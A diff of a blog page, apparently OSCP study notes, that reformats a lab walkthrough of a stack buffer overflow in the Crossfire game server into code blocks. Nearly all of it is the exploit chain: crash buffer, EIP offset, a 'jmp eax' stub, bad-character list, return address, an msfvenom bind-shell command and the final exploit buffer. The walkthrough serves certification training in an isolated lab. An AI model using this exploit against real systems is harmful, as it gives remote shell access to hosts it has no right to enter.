@@ -3,10 +3,10 @@
 <head>
         <meta charset="utf-8" />
         <meta name="generator" content="Pelican" />
-        <title>Linux Buffer Overflow</title>
+        <title>Linux Buffer Overflow (Crossfire)</title>
         <link rel="stylesheet" href="/theme/css/main.css" />
         <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Digital Forensics Atom Feed" />
-        <meta name="description" content="Linux Buffer Overflow (Crossfire) Download a version of the vulnerable app Crossfire Setup safe environment: iptables only allow traffic from..." />
+        <meta name="description" content="Download a version of the vulnerable app Crossfire Setup safe environment: iptables only allow traffic from loopback interface=targetip iptables..." />
 </head>
 
 <body id="index" class="home">
@@ -27,7 +27,7 @@
     <header>
       <h1 class="entry-title">
         <a href="/linux-buffer-overflow.html" rel="bookmark"
-           title="Permalink to Linux Buffer Overflow">Linux Buffer Overflow</a></h1>
+           title="Permalink to Linux Buffer Overflow (Crossfire)">Linux Buffer Overflow (Crossfire)</a></h1>
     </header>
 
     <div class="entry-content">
@@ -41,77 +41,89 @@
         </address>
 <p>In <a href="/category/certifications.html">Certifications</a>.</p>
 <p>tags: <a href="/tag/oscp.html">OSCP</a> </p>
-</footer><!-- /.post-info -->      <h1>Linux Buffer Overflow (Crossfire)</h1>
-<p>Download a version of the vulnerable app Crossfire</p>
-<h3>Setup safe environment: iptables only allow traffic from loopback interface=targetip</h3>
-<p>iptables –A, -p, -d, -j # Append, protocol, destination, jump
-crossfire listens on port 13327
-iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j DROP
-iptables -A INPUT -p tcp --destination-port 4444 ! -d 127.0.0.1 -j DROP</p>
-<ol>
-<li>
-<p>Run debugger and crash the app
-Get POC code from exploit db
-edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
-crash = “\x41” *4379
-buffer = “\x11(setup sound “ + crash + “\x90\x00#”
-python fuzz.py</p>
-</li>
-<li>
-<p>Control EIP
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
-Swap into the crash var: python linux_buffer_overflow.py 
+</footer><!-- /.post-info -->      <p>Download a version of the vulnerable app Crossfire</p>
+<h2>Setup safe environment: iptables only allow traffic from loopback interface=targetip</h2>
+<div class="highlight"><pre><span></span><code>iptables –A, -p, -d, -j <span class="c1"># Append, protocol, destination, jump</span>
+crossfire listens on port <span class="m">13327</span>
+iptables -A INPUT -p tcp --destination-port <span class="m">13327</span> <span class="se">\!</span> -d <span class="m">127</span>.0.0.1 -j DROP
+iptables -A INPUT -p tcp --destination-port <span class="m">4444</span> <span class="se">\!</span> -d <span class="m">127</span>.0.0.1 -j DROP
+</code></pre></div>
+
+<h2>Run debugger and crash the app</h2>
+<p>Get POC code from exploit db</p>
+<div class="highlight"><pre><span></span><code>edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="n">crash</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span><span class="mi">4379</span>
+<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x11</span><span class="s2">(setup sound &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x00</span><span class="s2">#&quot;</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>python fuzz.py
+</code></pre></div>
+
+<h2>Control EIP</h2>
+<div class="highlight"><pre><span></span><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span class="m">4379</span>
+</code></pre></div>
+
+<p>Swap into the crash var: python linux_buffer_overflow.py 
 EIP has been overwritten with the hex characters… 46 36 70 46
-These are unique 4 bytes in the buffer. Now find where they are in the buffer.
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046
-[*] Exact match at offset 4368
-Replace “crash = "\x41" * 4368 + "B" * 4 + "C" * 7”: python EIP_BBBB.py</p>
-</li>
-<li>
-<p>Make space for the shellcode<br>
-Check for helpful registers: Follow in dump.
-EAX points to buffer start “setup sound “ opstring (len 12). Want to avoid these bytes. 
-ESP points to end of buffer “C * 7” (spare bytes). 
-Add 12 bytes to EAX to align EAX with the A’s =&gt; JMP EAX we skip over “setup sound “
-/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+These are unique 4 bytes in the buffer. Now find where they are in the buffer.</p>
+<div class="highlight"><pre><span></span><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <span class="m">4379</span> -q <span class="m">46367046</span>
+<span class="o">[</span>*<span class="o">]</span> Exact match at offset <span class="m">4368</span>
+</code></pre></div>
+
+<p>Replace: </p>
+<div class="highlight"><pre><span></span><code><span class="n">crash</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">4368</span> <span class="o">+</span> <span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span> <span class="o">*</span> <span class="mi">7</span><span class="s2">&quot;: python EIP_BBBB.py</span>
+</code></pre></div>
+
+<h2>Make space for the shellcode</h2>
+<p>Check for helpful registers: Follow in dump.
+EAX points to buffer start "setup sound " opstring (len 12). Want to avoid these bytes. 
+ESP points to end of buffer "C * 7" (spare bytes). 
+Add 12 bytes to EAX to align EAX with the A's =&gt; JMP EAX we skip over "setup sound"</p>
+<div class="highlight"><pre><span></span><code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm &gt; add eax,12   83C00C add eax,byte +0xc
 nasm &gt; jmp eax      FFE0 jmp eax
-Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?</p>
-</li>
-<li>
-<p>Discover bad characters
-All bad chars (except x00) contained in deault named script. Can use this for future.
+</code></pre></div>
+
+<p>Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. 
+Looks like I didn’t test again here? Just note nasm output and move on?</p>
+<h2>Discover bad characters</h2>
+<p>All bad chars (except x00) contained in deault named script. Can use this for future.
 python bad_chars.py
 ID/remove bad chars in buffer. Right-click EAX. Follow in stack &amp; dump. Stack looked better in EDBG. Scroll down dump until end of A’s. Then should see 01, 02, 03… etc until a failure. remove failure from bad_chars.py. Redo until ESP-error-free crash 
 Removed: (\x00\x0a\x0d\x20)</p>
-</li>
-<li>
-<p>Redirect execution flow - Find a return address
-So, we know we want to reach the buffer pointed to by the ESP register.
+<h2>Redirect execution flow - Find a return address</h2>
+<p>So, we know we want to reach the buffer pointed to by the ESP register.
 EDBG: Plugins: Opcode Seacher: 
 Once the application is in a crashed state use dropdown to search for:
 ESP -&gt; EIP: 
-Choose 1st JMP ESP. Add address to python script at BBBB.
-crash = "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90“
-EDBG: Add breakpoint at 0x08134597 to execution flow. 
+Choose 1st JMP ESP. Add address to python script at BBBB.</p>
+<div class="highlight"><pre><span></span><code><span class="n">crash</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">4368</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x97\x45\x13\x08</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x83\xc0\x0c\xff\xe0\x90\x90</span><span class="s2">&quot;</span>
+</code></pre></div>
+
+<p>EDBG: Add breakpoint at 0x08134597 to execution flow. 
 Right-click Go to Address 0x08134597. Double click on it to place breakpoint.
 Restart EDBG. Send payload. Should pause at First stage payload.
 Next instruction is JMP ESP. F8. We are redirected to ESP 83C00C 
-As EAX register aligned by stage one, a JMP EAX takes us to a clean buffer of A’s</p>
-</li>
-<li>Make shellcode excluding bad characters
-bind or reverse? why?
-msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c –b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
-Resulting shell code is 105 bytes</li>
-<li>Add shellcode into python script
-shellcode = ("\xd9... \x30")
-ret="\x97\x45\x13\x08”
-crash=shellcode + "\x41" * (4368 - 105) + ret + "\x83\xC0\x0C\xFF\xE0\x90\x90“
-buffer = "\x11(setup sound " + crash + "\x90\x00#“
-TURN OFF EDBG FOR EXPLOIT TO WORK: RUN CROSSFIRE: RUN EXPLOIT /usr/games/crossfire/bin/crossfire
-python exploit.py
-id; whoami</li>
-</ol>
+As EAX register aligned by stage one, a JMP EAX takes us to a clean buffer of A's</p>
+<h2>Make shellcode excluding bad characters</h2>
+<p>bind or reverse? why?</p>
+<div class="highlight"><pre><span></span><code>msfvenom -p linux/x86/shell_bind_tcp <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f c –b <span class="s2">&quot;\x00\x0a\x0d\x20&quot;</span> –e x86/shikata_ga_nai
+</code></pre></div>
+
+<p>Resulting shell code is 105 bytes</p>
+<h2>Add shellcode into python script</h2>
+<div class="highlight"><pre><span></span><code><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\xd9</span><span class="s2">\... </span><span class="se">\x30</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">ret</span><span class="o">=</span><span class="s2">&quot;</span><span class="se">\x97\x45\x13\x08</span><span class="s2">&quot;</span>
+<span class="n">crash</span><span class="o">=</span><span class="n">shellcode</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4368</span> <span class="o">-</span> <span class="mi">105</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x83\xC0\x0C\xFF\xE0\x90\x90</span><span class="s2">&quot;</span>
+<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x11</span><span class="s2">(setup sound &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x00</span><span class="s2">#&quot;</span>
+</code></pre></div>
+
+<p>TURN OFF EDBG FOR EXPLOIT TO WORK: RUN CROSSFIRE: RUN EXPLOIT /usr/games/crossfire/bin/crossfire</p>
+<div class="highlight"><pre><span></span><code>python exploit.py
+id<span class="p">;</span> whoami
+</code></pre></div>
     </div><!-- /.entry-content -->
 
   </article>
